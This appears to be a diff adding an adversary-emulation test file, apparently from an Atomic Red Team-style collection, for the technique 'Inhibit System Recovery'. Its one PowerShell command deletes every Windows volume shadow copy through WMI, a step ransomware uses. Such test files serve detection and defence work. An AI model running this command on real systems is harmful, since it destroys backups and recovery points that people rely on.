@@ -1,0 +1,7 @@
+#TechniqueName: Inhibit System Recovery
+#AtomicTestName: Windows - Delete Volume Shadow Copies via WMI with PowerShell
+#Language: ps1
+
+#commands
+Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+
